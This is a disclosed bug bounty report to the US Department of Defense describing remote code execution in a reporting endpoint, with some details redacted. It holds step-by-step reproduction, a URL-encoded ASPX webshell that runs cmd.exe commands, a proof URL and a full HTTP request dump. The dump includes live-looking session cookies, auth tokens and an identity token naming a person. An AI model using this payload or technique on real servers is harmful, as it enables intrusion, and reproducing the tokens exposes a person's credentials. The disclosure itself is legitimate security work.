# [hta3] Remote Code Execution on ████

## Report Details
- **Report ID**: 1072832
- **URL**: https://hackerone.com/reports/1072832
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-01-06T16:22:19.668Z
- **Disclosed**: 2023-05-15T15:10:54.365Z

## Reporter
- **Username**: cdl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Note**
In the days leading up to this event, I looked at `███████` due to the ████████ press release which described this as the scope for this event. I understand that this is outside of the current scope but I feel obligated to report this.

Press release: ██████████
> "During the third iteration the entire ██████ domain can be targeted by participants as well, but rewards will be paid only for discovering certain categories of vulnerabilities."

# Summary
The endpoint at ████ is vulnerable to a remote code execution vulnerability. The `?rdExportFilename=` parameter allows an attacker to write any filetype to any folder and the `rdReportName` parameter allows them to control the contents. This allows them to write a webshell to the server.

## Reproduction Steps:
1. Visit ██████████and login with the credentials: `█████`
2. Go here: ██████and scroll down to the "Reports" section. i
3. Choose any of them and click "Run Report". In the pop-up, click Run Report again.
4. You will be redirected to `█████?rdNoShowWait=True`. Wait for this page to load.
5. Start intercepting requests with Burp Suite.
6. In the upper right-hand corner, click "Export to Excel" and intercept the POST request to `/RServer/rdPage.aspx`
7. Change the `rdReportFormat` and the `rdExcelOutputFormat` query parameters to `NativeExcel`.
8. Change the `rdExportFilename` parameter to `yourfilename.aspx`
9. In the POST body, change the `rdReportName` parameter to your url-encoded aspx shell:

```
%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e
```

10. Now forward the request and you will be redirected to your shell.

Proof:

████████//RServer/rdDownload/rdExport-2b03ab86-09b8-47d8-82de-53c8d7a59f8d/7a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff317.aspx?68c2c8b1fc47766eaf43027a8eaca121=whoami


████████

whoami: `█████████`

## HTTP Request Dump
```
POST /RServer/rdPage.aspx?rdReport=agContentAccess&rdDataCache=1361055732&rdShowModes=%3dIIF(Left(%22agContentAccess%22%2c2)%20%3d%20%22ag%22%2c%20%22rdAgTable%22%2c%20)&rdReportFormat=NativeExcel&rdRequestForwarding=Form&rdExcelOutputFormat=NativeExcel&rdExportFilename=7a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff317.aspx HTTP/1.1
Host:████████
Connection: close
Content-Length: 4639
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: ██████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: ████?rdNoShowWait=True
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: rdShowWaitUID=c866fd33-1ea8-4a08-8a2b-dc54372b4f2c; ASP.NET_SessionId=uaxhmmo4ffs3phxyysunzr3f; owin.skinId=4C90EFD0820345C0897EF44ED6BFC332; UserDomainId=ML.BASE.Domain.Id.Core; mg.requesttrackingid=3b29f9d0-7c04-4f82-8f2b-0f4a86f43ac2; mg.localeid=en-US; _ga=GA1.2.824910952.1609908283; _gid=GA1.2.630356640.1609908283; mg.clientid=9xWgk3zROzU07cGA3nzzMF%2BO1W4afEGAdu2uNjg2CXBVoQpFuWN4%2FeicI3GZIb3JC8yKByiGir5V%2BmZGLS8fGqUC9i8lSSmtXYwIxfnho3lC4ahL; mg.redirect=d2KfXvekHELGNGGoPlFEpw3k7XNMApDZNg%2FX321fCnKKl0oVS4Xte0MFhD7l6%2BQi%2B6deUP2WhILOx6BIZYYnCDj7XkSBqrqpJhFkEedsBI3MnQBWMs78soQwn9tLS0SwnjIG0EFbUbR6%2FnDZYlpqBgCQqCyqqq%2BrHdb2p4pc1B%2FvOq6idhVmG54nsfgQmiTa7pcYB8PVmTT9F%2FDMjci%2FNXCeIX5htjwRci6s6IMePVh3ZWQIkPaUokBw1GuKzIXZIZGAazWo0ap0SN3jEXFoJUJkNwZ8DTGdsYsES707KKr8EPoBM6q2AnP8YpBBEA6nb9LjhlJgb%2FfkJJ%2BetO5gNtt6mcVSZhsfMvtn4YNSYS6YqhkkOiEbLDzmtEJQn7kJxS4RVSov6L8zF40u2BY8dW2jnZ3VxK49EVqex014le8768GuRT5xWNT8dP7CRmKGQ2zGtxvUw2TZqM8Im%2FNT8smuCGieA17bi%2B3f7ghJwvQIdEZT9huOoo09FDBqAC9eS7Fplav8VLtjIYmZA7Fb6yneh%2BzDJv8gbcM%2FisQFrZB9V4Jnlto1mdprhmPrfjAHgTVFjmC%2F%2Bmd9zlkVrVgsTLJcc1I%3D; mg.request_scheme=u5fPP8roFKP%2Fx%2BF6Pv90Mts7z4X8%2FhA%2FrJSII5oiuPpBHpfSJawLK7jKe3FMdYq%2Fw55Xzw%3D%3D; mg.signin=; mg.id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlBrSFZlaVlRVFotWXdJNk9ZM0xIdjNJWkNRdyIsImtpZCI6IlBrSFZlaVlRVFotWXdJNk9ZM0xIdjNJWkNRdyJ9.eyJpc3MiOiJodHRwczovL2xtcy5td3IuYXJteS5taWwvaWRzZXJ2L2xvZ2luIiwiYXVkIjoiNUI2RDRFREUwRDk1NDE3Mjk4NDdEQUM5RDZCNkUwRDUiLCJleHAiOjE2MTAwMzA0NTEsIm5iZiI6MTYwOTk0NDA1MSwibm9uY2UiOiI5M2U4ZmViYjYwODA0MmY1OWFhOTJhNTdiNmUyMGQ2NyIsImlhdCI6MTYwOTk0NDA1MSwic2lkIjoiMDM4YjgzZThkZGQ3MGNjMWI3ODk5OGExNzVhNDI2ZWMiLCJzdWIiOiI1NDBCMDg3NzcwMTY0RTRFQTI0Q0ZGNTE3M0Y1M0QzNiIsImF1dGhfdGltZSI6MTYwOTk0NDA1MSwiaWRwIjoicGFzc3dvcmQiLCJuYW1lIjoiY2RsMTMzNyIsImdpdmVuX25hbWUiOiJDb3JiZW4iLCJmYW1pbHlfbmFtZSI6ImFzZGYiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy93ZWJwYWdlIjoicGFzc3dvcmQiLCJhbXIiOlsiZXh0ZXJuYWwiXX0.GkWU8LxgwcpXKiXhjBDPaccucwxaIoQkqaLvs6ZFj_HYGRe7zetpzFYgOMFJXuBcO3e0Yk8ZClvspABvSFrc3TDEPxIyb-kJUgyp2QvoBZjdYHZFGUvYqZeaYD4sVwGCz6pvVUhiAdPxXf20PmTQXbIxkHMkEchp2z7S_F-HEtIavI9nRXyekXX0wZY78C1d71LMhImC3JdkcANj-giddDbTdpz2OmPyXMrOC3PEGxO5rVX8oimkcz1jdgJ3vvLpyDeZ8fBMCuVT5TgFoAMa5aM8nu8FIP5euKqohYHFxpP6MuVw35NQkMUnf-iC2VCElp6X8USB7SA0s0kze3kfEA; mg.loginmethodology=password; MGKIToken=USR_LMS_USER_ID=540B087770164E4EA24CFF5173F53D36&DomainId=ML.BASE.Domain.Id.Core&LocaleId=en-US&KISessionId=7142f58b-5ee9-4391-8f79-41cabd05b359; mgauthtoken=D6124B94CC676F01318D455CB75AF13582B2FE697C75F6277A640F60A3628468FA6983F27575A440EFEC2758E9B924701F0C055E3935AEBFD1649DF3A667D12C9E1264B0E8E605A4099521E9F9D53BD313D4CA36D43B13B2150663E3C8F540D291F680CA73AB57D0F48C65003C95027F9E1C928A2EB88A8FB9D4FB3FC4EDCA064FCA167255B849389736BDBEA869A40382A3511B9C7410AEA04DBAF2D03AC043F4809E18; RequestLocaleId=en-US; strFeedback=; rdShowWaitUID=c866fd33-1ea8-4a08-8a2b-dc54372b4f2c; rdPanelExpanded_Table=True; rdTablePanelMenuExpanded=False; rdAllowRedo=False; rdAllowUndo=False

rdCSRFKey=1cd8a8e9-1362-465b-958b-798ff44f440d&itxSaveNewLayout=&AgReportLayoutGUID=02f74a12-70b6-4033-ad15-364a30e2cde8&rdAgDataColumnDetails=%2CLAST_NAME%3BLast+Name%3AText%2CFIRST_NAME%3BFirst+Name%3AText%2CCOURSE_NAME%3BContent+Title%3AText%2CCONTENT_TYPE%3BContent+Type%3AText%2CSTART_DATE%3BStart+Date%3ADateTime%2CCOMPLETE_DATE%3BComplete+Date%3ADateTime%2CLAST_ACCESS_DATE%3BLast+Launch%3ADateTime%2CATTEMPT%3BTotal+Launches%3ANumber%2COPT_USR_JOB_TITLE%3BJob+Title%3AText%2COPT_USR_MANAGER_ID%3BManager%3AText%2COPT_USR_EMAIL_ADDRESS%3BEmail+Address%3AText%2COPT_USR_ORGANIZATION_ID%3BOrganization%3AText%2COPT_USR_STATE_ID%3BState%3AText%2COPT_USR_COUNTRY_ID%3BCountry%3AText%2COPT_USER_ACTIVITY%3BActivity%3AText%2COPT_USR_LOGIN_ID%3BLogin+ID%3AText%2COPT_USR_LMS_USER_ID%3BUser+ID%3AText%2COPT_GLAIT_ALTERNATE_ID%3BGLAIT+Alternate+ID%3AText%2COPT_CNTVER_VERSION_NUMBER%3BVersion+Number%3AText&rdAgCurrentOpenPanel=&rdAllowCrosstabBasedOnCurrentColumns=True&rdAgCalcName=&rdAgCalcDataColumns=&rdAgCalcFormula=&rdAgCalcDataTypes=Number&rdAgCalcFormats=&rdAfMode_rdAgAnalysisFilter=Design&rdAfFilterColumnID_rdAgAnalysisFilter=&rdAfFilterOperator_rdAgAnalysisFilter=%3D&rdAfSlidingTimeStartDateFilterOperator_rdAgAnalysisFilter=Specific+Date&rdAfSlidingTimeStartDateFilterOperatorOptions_rdAgAnalysisFilter=Today&rdAfFilterStartDate_rdAgAnalysisFilter=&rdAfFilterStartDate_rdAgAnalysisFilter_Hidden=&rdReformatDaterdAfFilterStartDate_rdAgAnalysisFilter=yyyy-MM-dd&rdDateFormatrdAfFilterStartDate_rdAgAnalysisFilter=M%2Fd%2Fyyyy&rdAfFilterStartTime_rdAgAnalysisFilter=&rdAfFilterStartTime_rdAgAnalysisFilter_Hidden=8%3A48+AM&rdReformatTimerdAfFilterStartTime_rdAgAnalysisFilter=HH%3Amm%3Ass&rdFormatTimerdAfFilterStartTime_rdAgAnalysisFilter=t&rdAfSlidingTimeEndDateFilterOperator_rdAgAnalysisFilter=Specific+Date&rdAfSlidingTimeEndDateFilterOperatorOptions_rdAgAnalysisFilter=Today&rdAfFilterEndDate_rdAgAnalysisFilter=&rdAfFilterEndDate_rdAgAnalysisFilter_Hidden=&rdReformatDaterdAfFilterEndDate_rdAgAnalysisFilter=yyyy-MM-dd&rdDateFormatrdAfFilterEndDate_rdAgAnalysisFilter=M%2Fd%2Fyyyy&rdAfFilterEndTime_rdAgAnalysisFilter=&rdAfFilterEndTime_rdAgAnalysisFilter_Hidden=8%3A48+AM&rdReformatTimerdAfFilterEndTime_rdAgAnalysisFilter=HH%3Amm%3Ass&rdFormatTimerdAfFilterEndTime_rdAgAnalysisFilter=t&rdAfFilterValue_rdAgAnalysisFilter=&rdAfFilterValueMax_rdAgAnalysisFilter=&rdAgCurrentOpenTablePanel=&rdAgId=agResults&rdAgReportId=agContentAccess&rdAgDraggablePanels=True&rdAgPanelOrder=rowTable&rdICL-iclLayout=colRowNumber%2CcolLastName%2CcolFirstName%2CcolContentTitle%2CcolContentType%2CcolStartDate%2CcolCompleteDate%2CcolLastAccessDate%2CcolTotalLaunches%2CcolReportMenu%2C&iclLayout_rdExpandedCollapsedHistory=&iclLayout=colRowNumber&iclLayout=colLastName&iclLayout=colFirstName&iclLayout=colContentTitle&iclLayout=colContentType&iclLayout=colStartDate&iclLayout=colCompleteDate&iclLayout=colLastAccessDate&iclLayout=colTotalLaunches&iclLayout=colReportMenu&rdAgGroupColumn=&rdAgPickDateColumnsForGrouping=%2CSTART_DATE%2CCOMPLETE_DATE%2CLAST_ACCESS_DATE%2C&rdAgDateGroupBy=&rdAgAggrColumn=&rdAgAggrFunction=SUM&rdAgAggrRowPosition=RowPositionTop&rdAgOrderColumn=&rdAgOrderDirection=Ascending&rdAgPaging=ShowPaging&rdAgRowsPerPage=25&rdAgCurrentOpenTablePanel=&rdPanelTitle_actAddToDashboardDataTable=Table&rdPanelDescription_actAddToDashboardDataTable=&rdShowElementHistory=&strECOrderStatus=&strOptionalSets=UserShort%2CUserId%2CVersion&userID=540B087770164E4EA24CFF5173F53D36&SkinValue=4C90EFD0820345C0897EF44ED6BFC332&CurrentUserId=540B087770164E4EA24CFF5173F53D36&rdReportSubType=&RequestLocaleId=en-US&strOrderNumber=&strTrainingPeriodDeadline=&rdWaitCaption=Loading+.+.+.&strContentTypeEC=&strPageRowCount=25&strExternalLearningTitle=&TZMinutesOffset=-60&strDateFrom=1%2F1%2F1997+1%3A00%3A00+AM&strIncludeInactiveUser=F&strCompletionStatus=&strProgressStatus=&rdReportName=%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e&strSectionActivity=T&strContentActivity=T&strTrainingPeriodStatus=&strIncludeInactiveContent=F&strDateTo=1%2F7%2F2021+12%3A59%3A59+AM&CurrentDomainId=ML.BASE.Domain.Id.Core&strOrderNumberSearchType=ML.BASE.DV.SearchContains&RequestTimeZoneId=20&strContentTypeRT=&strReportId=ML.BASE.RPT.AG.ContentAccess.Manager&SystemCurrencySymbol=%24&strECItemStatus=&strUserActivity=T&KviewPath=https%3A%2F%2Flms.mwr.army.mil&strExternalLearningType=&strContentType=&strExemptionType=&blnHasManagePerm=F&rdReportType=MANAGER&strDeliveryMethod=&RequestRegionId=en-US&strExternalLearningStatus=&rdAfFilterValueBoolean_rdAgAnalysisFilter=False&rdAgExcludeDetailRowsCheckbox=False&rdAgHideFunctionNamesCheckbox=False&rdRnd=7503
```

## Impact

Critical, an attacker can execute commands on this military server.

Best,
@cdl

## Attachments
No attachments
